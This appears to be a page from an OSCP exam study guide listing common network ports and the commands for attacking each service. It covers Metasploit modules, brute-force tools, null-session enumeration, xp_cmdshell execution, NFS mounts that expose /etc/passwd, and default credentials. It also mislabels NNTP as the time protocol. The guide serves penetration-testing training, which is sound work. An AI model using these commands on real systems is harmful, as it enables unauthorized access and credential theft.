+<p><a href="https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/" target="_blank">https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/</a></p>
+<h2 id="port-69---tftp">Port 69 - TFTP</h2>
+<p>This is a ftp-server but it is using UDP.</p>
+<h2 id="port-80---http">Port 80 - HTTP</h2>
+<p>Info about web-vulnerabilities can be found in the next chapter <code>HTTP - Web Vulnerabilities</code>.</p>
+<p>We usually just think of vulnerabilities on the http-interface, the web page, when we think of port 80. But with <code>.htaccess</code> we are able to password protect certain directories. If that is the case we can brute force that the following way.</p>
+<h3 id="password-protect-directory-with-htaccess">Password protect directory with htaccess</h3>
+<p><strong>Step 1</strong></p>
+<p>Create a directory that you want to password-protect.
+Create .htaccess tile inside that directory.
+Content of .htaccess:</p>
+<pre><code>AuthType Basic
+AuthName &quot;Password Protected Area&quot;
+AuthUserFile /var/www/html/test/.htpasswd
+Require valid-user
+</code></pre><p>Create .htpasswd file</p>
+<pre><code>htpasswd -cb .htpasswd test admin
+service apache2 restart
+</code></pre><p>This will now create a file called .htpasswd with the user: test and the password: admin</p>
+<p>If the directory does not display a login-prompt, you might have to change the <strong>apache2.conf</strong> file. To this:</p>
+<pre><code>&lt;Directory /var/www/html/test&gt;
+    AllowOverride AuthConfig
+&lt;/Directory&gt;
+</code></pre><h3 id="brute-force-it">Brute force it</h3>
+<p>Now that we know how this works we can try to brute force it with medusa.</p>
+<pre><code>medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+</code></pre><h2 id="port-88---kerberos">Port 88 - Kerberos</h2>
+<p>Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.</p>
+<p>If you already have a login to a user of that domain you might be able to escalate that privilege.</p>
+<p>Check out:
+MS14-068</p>
+<h2 id="port-110---pop3">Port 110 - Pop3</h2>
+<p>This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails.</p>
+<pre><code>telnet 192.168.1.105 110
+USER pelle@192.168.1.105
+PASS admin
+
+# List all emails
+list
+
+# Retrive email number 5, for example
+retr 5
+</code></pre><h2 id="port-111---rpcbind">Port 111 - Rpcbind</h2>
+<p>RFC: 1833</p>
+<p>Rpcbind can help us look for NFS-shares. So look out for nfs.
+Obtain list of services running with RPC:</p>
+<pre><code>rpcbind -p 192.168.1.101
+</code></pre><h2 id="port-119---nntp">Port 119 - NNTP</h2>
+<p>Network time protocol. 
+It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time. </p>
+<p>An attacker could use this to change the time. Which might cause denial of service and all around havoc.</p>
+<h2 id="port-135---msrpc">Port 135 - MSRPC</h2>
+<p>This is the windows rpc-port.
+<a href="https://en.wikipedia.org/wiki/Microsoft_RPC" target="_blank">https://en.wikipedia.org/wiki/Microsoft_RPC</a></p>
+<h3 id="enumerate">Enumerate</h3>
+<pre><code>nmap 192.168.0.101 --script=msrpc-enum
+</code></pre><pre><code>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
+</code></pre><h2 id="port-139-and-445--smbsamba-shares">Port 139 and 445- SMB/Samba shares</h2>
+<p>Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.</p>
+<h3 id="connecting">Connecting</h3>
+<p>For linux-users you can log in to the smb-share using smbclient, like this:</p>
+<pre><code>smbclient -L 192.168.1.102
+smbclient //192.168.1.106/tmp
+smbclient \\\\192.168.1.105\\ipc$ -U john 
+smbclient //192.168.1.105/ipc$ -U john
+</code></pre><p>If you don&apos;t provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.</p>
+<p>So smb, for a linux-user, is pretty much like and ftp or a nfs.</p>
+<p>Here is a good guide for how to configure samba:
+<a href="https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way!" target="_blank">https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way!</a></p>
+<pre><code>mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 &quot;//10.10.10.10/My Share&quot; /mnt/cifs
+</code></pre><h3 id="connectin-with-psexec">Connectin with PSExec</h3>
+<p>If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.</p>
+<pre><code>use exploit/windows/smb/psexec
+</code></pre><h3 id="scanning-with-nmap">Scanning with nmap</h3>
+<p>Scanning for smb with Nmap</p>
+<pre><code>nmap -p 139,445 192.168.1.1/24
+</code></pre><p>There are several NSE scripts that can be useful, for example:</p>
+<pre><code>ls -l /usr/share/nmap/scripts/smb*
+</code></pre><pre><code>-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse
+-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse
+-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse
+-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse
+-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
+-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse
+-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse
+-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse
+-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse
+-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse
+-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse
+-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse
+-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse
+-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse
+-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse
+-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse
+-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse
+-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
+-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+</code></pre><pre><code>nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
+</code></pre><h3 id="nbtscan">nbtscan</h3>
+<pre><code>nbtscan -r 192.168.1.1/24
+</code></pre><p>It can be a bit buggy sometimes so run it several times to make sure it found all users.</p>
+<h3 id="enum4linux">Enum4linux</h3>
+<p>Enum4linux can be used to enumerate windows and linux machines with smb-shares. </p>
+<p>The do all option:</p>
+<pre><code>enum4linux -a 192.168.1.120
+</code></pre><p>For info about it ere: <a href="https://labs.portcullis.co.uk/tools/enum4linux/" target="_blank">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>
+<h3 id="rpcclient">rpcclient</h3>
+<p>You can also use rpcclient to enumerate the share.</p>
+<p>Connect with a null-session. That is, without a user. This only works for older windows servers.</p>
+<pre><code>rpcclient -U &quot;&quot; 192.168.1.101
+</code></pre><p>Once connected you could enter commands like</p>
+<pre><code>srvinfo
+enumdomusers
+getdompwinfo
+querydominfo
+netshareenum
+netshareenumall
+</code></pre><h2 id="port-143993---imap">Port 143/993 - IMAP</h2>
+<p>IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap.</p>
+<p>IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.</p>
+<p>Port 993 is the secure port for IMAP.</p>
+<h2 id="port-161-and-162---snmp">Port 161 and 162 - SNMP</h2>
+<p>Simple Network Management Protocol</p>
+<p>SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.</p>
+<p>SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.</p>
+<p>You can have read-only access to the snmp.Often just with the community string <code>public</code>. </p>
+<p>Common community strings</p>
+<pre><code>public
+private
+community
+</code></pre><p>Here is a longer list of common community strings: <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt" target="_blank">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt</a></p>
+<h3 id="mib---management-information-base">MIB - Management information base</h3>
+<p>SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The &quot;leaf&quot; or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.</p>
+<h4 id="snmpwalk">snmpwalk</h4>
+<pre><code>snmpwalk -c public -v1 192.168.1.101 #community string and which version
+</code></pre><p>This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won&apos;t understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:</p>
+<pre><code>1.3.6.1.2.1.25.1.6.0 System Processes
+1.3.6.1.2.1.25.4.2.1.2 Running Programs
+1.3.6.1.2.1.25.4.2.1.4 Processes Path
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+1.3.6.1.2.1.25.6.3.1.2 Software Name
+1.3.6.1.4.1.77.1.2.25 User Accounts
+1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+</code></pre><p>Now we can use this to query the data we really want.</p>
+<h4 id="snmpenum">snmpenum</h4>
+<h4 id="snmp-check">snmp-check</h4>
+<p>This is a bit easier to use and with a lot prettier output.</p>
+<pre><code>snmp-check -t 192.168.1.101 -c public
+</code></pre><h3 id="scan-for-open-ports---nmap">Scan for open ports - Nmap</h3>
+<p>Since SNMP is using UDP we have to use the <code>-sU</code> flag.</p>
+<pre><code>nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
+</code></pre><h3 id="onesixtyone">Onesixtyone</h3>
+<p>With onesixtyone you can test for open ports but also brute force community strings.
+I have had more success using onesixtyone than using nmap. So better use both.</p>
+<pre><code>
+
+</code></pre><h3 id="metasploit">Metasploit</h3>
+<p>There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff.</p>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/snmp-scan/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/snmp-scan/</a></p>
+<h2 id="port-199---smux">Port 199 - Smux</h2>
+<h2 id="port-389636---ldap">Port 389/636 - Ldap</h2>
+<p>Lightweight Directory Access Protocol.
+This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. 
+Ldap is used more often in corporate structure.
+Webapplications can use ldap for authentication. If that is the case it is possible to perform <strong>ldap-injections</strong> which are similar to sqlinjections.</p>
+<p>You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.</p>
+<pre><code>ldapsearch -h 192.168.1.101 -p 389 -x -b &quot;dc=mywebsite,dc=com&quot;
+</code></pre><p>When a client connects to the Ldap directory it can use it to query data, or add or remove. </p>
+<p>Port 636 is used for SSL.</p>
+<p>There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1</p>
+<h2 id="port-443---https">Port 443 - HTTPS</h2>
+<p>Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities. </p>
+<h3 id="heartbleed">Heartbleed</h3>
+<p>OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
+OpenSSL 1.0.1g is NOT vulnerable
+OpenSSL 1.0.0 branch is NOT vulnerable
+OpenSSL 0.9.8 branch is NOT vulnerable</p>
+<p>First we need to investigate if the https-page is vulnerable to <a href="http://heartbleed.com/" target="_blank">heartbleed</a></p>
+<p>We can do that the following way.</p>
+<pre><code>sudo sslscan 192.168.101.1:443
+</code></pre><p>or using a nmap script</p>
+<pre><code>nmap -sV --script=ssl-heartbleed 192.168.101.8
+</code></pre><p>You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.</p>
+<pre><code>use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS 192.168.101.8
+set verbose true
+run
+</code></pre><p>Now you have a flow of random data, some of it might be of interest to you.</p>
+<h3 id="crime">CRIME</h3>
+<h3 id="breach">Breach</h3>
+<h3 id="certificate">Certificate</h3>
+<p>Read the certificate. </p>
+<ul>
+<li>Does it include names that might be useful?</li>
+<li>Correct vhost</li>
+</ul>
+<h1 id="port-554---rtsp">Port 554 - RTSP</h1>
+<p>RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that. </p>
+<h2 id="port-587---submission">Port 587 - Submission</h2>
+<p>Outgoing smtp-port</p>
+<p>If Postfix is run on it it could be vunerable to shellshock
+<a href="https://www.exploit-db.com/exploits/34896/" target="_blank">https://www.exploit-db.com/exploits/34896/</a></p>
+<h2 id="port-631---cups">Port 631 - Cups</h2>
+<p>Common UNIX Printing System has become the standard for sharing printers on a linux-network. 
+You will often see port 631 open in your priv-esc enumeration when you run <code>netstat</code>. You can log in to it here: <strong><a href="http://localhost:631/admin" target="_blank">http://localhost:631/admin</a></strong></p>
+<p>You authenticate with the OS-users.</p>
+<p>Find version. Test <strong>cups-config --version</strong>. If this does not work surf to <strong><a href="http://localhost:631/printers" target="_blank">http://localhost:631/printers</a></strong> and see the CUPS version in the title bar of your browser.</p>
+<p>There are vulnerabilities for it so check your searchsploit.</p>
+<h2 id="port-993---imap-encrypted">Port 993 - Imap Encrypted</h2>
+<p>The default port for the Imap-protocol.</p>
+<h2 id="port-995---pop3-encrypten">Port 995 - POP3 Encrypten</h2>
+<p>Port 995 is the default port for the <strong>Post Office Protocol</strong>.
+The protocol is used for clients to connect to the server and download their emails locally. 
+You usually see this port open on mx-servers. Servers that are meant to send and recieve email.</p>
+<p>Related ports: 
+110 is the POP3 non-encrypted.</p>
+<p>25, 465</p>
+<h2 id="port-1025---nfs-or-iis">Port 1025 - NFS or IIS</h2>
+<p>I have seen them open on windows machine. But nothing has been listening on it.</p>
+<h2 id="port-1030103210331038">Port 1030/1032/1033/1038</h2>
+<p>I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.</p>
+<h2 id="port-1433---mssql">Port 1433 - MsSQL</h2>
+<p>Default port for Microsoft SQL .</p>
+<pre><code>sqsh -S 192.168.1.101 -U sa
+</code></pre><h1 id="execute-commands">Execute commands</h1>
+<pre><code class="lang-bash"><span class="hljs-comment"># To execute the date command to the following after logging in</span>
+xp_cmdshell <span class="hljs-string">&apos;date&apos;</span>
+go
+</code></pre>
+<p>Many o the scanning modules in metasploit requires authentication. But some do not.</p>
+<pre><code>use auxiliary/scanner/mssql/mssql_ping
+</code></pre><h3 id="brute-force">Brute force.</h3>
+<pre><code>scanner/mssql/mssql_login
+</code></pre><p>If you have credencials look in metasploit for other modules.</p>
+<h2 id="port-1521---oracle-database">Port 1521 - Oracle database</h2>
+<p>Enumeration</p>
+<pre><code>tnscmd10g version -h 192.168.1.101
+tnscmd10g status -h 192.168.1.101
+</code></pre><p>Bruteforce the ISD</p>
+<pre><code>auxiliary/scanner/oracle/sid_brute
+</code></pre><p>Connect to the database with <code>sqlplus</code></p>
+<p>References:</p>
+<p><a href="http://www.red-database-security.com/wp/itu2007.pdf" target="_blank">http://www.red-database-security.com/wp/itu2007.pdf</a></p>
+<h2 id="ports-1748-1754-1808-1809---oracle">Ports 1748, 1754, 1808, 1809 - Oracle</h2>
+<p>These are also ports used by oracle on windows. They run Oracles <strong>Intelligent Agent</strong>.</p>
+<h2 id="port-2049---nfs">Port 2049 - NFS</h2>
+<p>Network file system
+This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.</p>
+<p>If the service is on its default port you can run this command to see what the filesystem is sharing</p>
+<pre><code>showmount -e 192.168.1.109
+</code></pre><p>Then you can mount the filesystem to your machine using the following command</p>
+<pre><code>mount 192.168.1.109:/ /tmp/NFS
+mount -t 192.168.1.109:/ /tmp/NFS
+</code></pre><p>Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.</p>
+<p>This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.</p>
+<h2 id="port-2100---oracle-xml-db">Port 2100 - Oracle XML DB</h2>
+<p>There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it. </p>
+<p>Can be accessed through ftp.
+Some default passwords here: 
+<a href="https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm" target="_blank">https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</a>
+Name: 
+Version:</p>
+<p>Default logins:
+sys:sys
+scott:tiger</p>
+<h2 id="port-3268---globalcatldap">Port 3268 - globalcatLdap</h2>
+<h2 id="port-3306---mysql">Port 3306 - MySQL</h2>
+<p>Always test the following:</p>
+<p>Username: root</p>
+<p>Password: root</p>
+<pre><code>mysql --host=192.168.1.101 -u root -p
+mysql -h &lt;Hostname&gt; -u root
+mysql -h &lt;Hostname&gt; -u root@localhost
+mysql -h &lt;Hostname&gt; -u &quot;&quot;@localhost
+
+telnet 192.168.0.101 3306
+</code></pre><p>You will most likely see this a lot:</p>
+<pre><code>ERROR 1130 (HY000): Host &apos;192.168.0.101&apos; is not allowed to connect to this MySQL server
+</code></pre><p>This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.</p>
+<h3 id="configuration-files">Configuration files</h3>
+<pre><code>cat /etc/my.cnf
+</code></pre><p><a href="http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html" target="_blank">http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html</a></p>
+<h3 id="mysql-commands-cheat-sheet">Mysql-commands cheat sheet</h3>
+<pre><code>http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html
+</code></pre><h3 id="uploading-a-shell">Uploading a shell</h3>
+<pre><code>You can also use mysql to upload a shell
+</code></pre><h3 id="escalating-privileges">Escalating privileges</h3>
+<p>If mysql is started as root you might have a chance to use it as a way to escalate your privileges.</p>
+<h4 id="mysql-udf-injection">MYSQL UDF INJECTION:</h4>
+<p><a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank">https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></p>
+<h3 id="finding-passwords-to-mysql">Finding passwords to mysql</h3>
+<p>You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?</p>
+<p>So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:</p>
+<pre><code>/var/www/html/configuration.php
+</code></pre><p>In that file you find the </p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JConfig</span> </span>{
+    <span class="hljs-keyword">var</span> $mailfrom = <span class="hljs-string">&apos;admin@rainng.com&apos;</span>;
+    <span class="hljs-keyword">var</span> $fromname = <span class="hljs-string">&apos;testuser&apos;</span>;
+    <span class="hljs-keyword">var</span> $sendmail = <span class="hljs-string">&apos;/usr/sbin/sendmail&apos;</span>;
+    <span class="hljs-keyword">var</span> $password = <span class="hljs-string">&apos;myPassowrd1234&apos;</span>;
+    <span class="hljs-keyword">var</span> $sitename = <span class="hljs-string">&apos;test&apos;</span>;
+    <span class="hljs-keyword">var</span> $MetaDesc = <span class="hljs-string">&apos;Joomla! - the dynamic portal engine and content management system&apos;</span>;
+    <span class="hljs-keyword">var</span> $MetaKeys = <span class="hljs-string">&apos;joomla, Joomla&apos;</span>;
+    <span class="hljs-keyword">var</span> $offline_message = <span class="hljs-string">&apos;This site is down for maintenance. Please check back again soon.&apos;</span>;
+    }
+</code></pre>
+<h2 id="port-3339---oracle-web-interface">Port 3339 - Oracle web interface</h2>
+<h2 id="port-3389---remote-desktop-protocol">Port 3389 - Remote Desktop Protocol</h2>
+<p>This is a proprietary protocol developed by windows to allow remote desktop.</p>
+<p>Log in like this</p>
+<pre><code>rdesktop -u guest -p guest 10.11.1.5 -g 94%
+</code></pre><p>Brute force like this</p>
+<pre><code>ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
+</code></pre><h3 id="ms12-020">Ms12-020</h3>
+<p>This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit. </p>
+<h2 id="port-4445---upnotifyp">Port 4445 - Upnotifyp</h2>
+<p>I have not found anything here. Try connecting with netcat and visiting in browser.</p>
+<h2 id="port-4555---rsip">Port 4555 - RSIP</h2>
+<p>I have seen this port being used by Apache James Remote Configuration. </p>
+<p>There is an exploit for version 2.3.2</p>
+<p><a href="https://www.exploit-db.com/docs/40123.pdf" target="_blank">https://www.exploit-db.com/docs/40123.pdf</a></p>
+<h2 id="port-47001---windows-remote-management-service">Port 47001 - Windows Remote Management Service</h2>
+<p>Windows Remote Management Service</p>
+<h2 id="port-5357---wsdapi">Port 5357 - WSDAPI</h2>
+<h2 id="port-5722---dfsr">Port 5722 - DFSR</h2>
+<blockquote>
+<p>The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.</p>
+</blockquote>
+<p>I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller. </p>
+<h2 id="port-5900---vnc">Port 5900 - VNC</h2>
+<p>VNC is used to get a screen for a remote host. But some of them have some exploits.</p>
+<p>You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.</p>
+<p>It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords</p>
+<pre><code>background
+use post/windows/gather/credentials/vnc
+set session X
+exploit
+</code></pre><pre><code>vncviewer 192.168.1.109
+</code></pre><h3 id="ctr-alt-del">Ctr-alt-del</h3>
+<p>If you are unable to input ctr-alt-del (kali might interpret it as input for kali).</p>
+<p>Try <code>shift-ctr-alt-del</code></p>
+<h3 id="metasploit-scanner">Metasploit scanner</h3>
+<p>You can scan VNC for logins, with bruteforce. </p>
+<p><strong>Login scan</strong></p>
+<pre><code>use auxiliary/scanner/vnc/vnc_login
+set rhosts 192.168.1.109
+run
+</code></pre><p><strong>Scan for no-auth</strong></p>
+<pre><code>use auxiliary/scanner/vnc/vnc_none_auth
+set rhosts 192.168.1.109
+run
+</code></pre><h2 id="port-8080">Port 8080</h2>
+<p>Since this port is used by many different services. They are divided like this.</p>
+<h3 id="tomcat">Tomcat</h3>
+<p>Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.</p>
+<h2 id="port-9389--">Port 9389 -</h2>
+<blockquote>
+<p>Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).</p>
+</blockquote>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="server-side-vulnerabilities.html" class="navigation navigation-prev " aria-label="Previous page: Server-side Vulnerabilities">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="port_knocking.html" class="navigation navigation-next " aria-label="Next page: Port Knocking">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Common ports\\/services and how to use them","level":"1.4.1.1","depth":3,"next":{"title":"Port Knocking","level":"1.4.1.2","depth":3,"path":"port_knocking.md","ref":"port_knocking.md","articles":[]},"previous":{"title":"Server-side Vulnerabilities","level":"1.4.1","depth":2,"path":"server-side-vulnerabilities.md","ref":"server-side-vulnerabilities.md","articles":[{"title":"Common ports\\/services and how to use them","level":"1.4.1.1","depth":3,"path":"list_of_common_ports.md","ref":"list_of_common_ports.md","articles":[]},{"title":"Port Knocking","level":"1.4.1.2","depth":3,"path":"port_knocking.md","ref":"port_knocking.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"github":"sushant747/security","theme":"default","author":"sushant747","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Total OSCP Guide","language":"en","links":{"sidebar":{"Total OSCP Guide":"https://www.gitbook.com/book/sushant747/total-oscp-guide"},"gitbook":true},"gitbook":"*","description":"This book captures knowledge base required for Offensive Security's OSCP Exam"},"file":{"path":"list_of_common_ports.md","mtime":"2017-03-26T09:38:56.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-28T08:38:17.767Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-comment/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
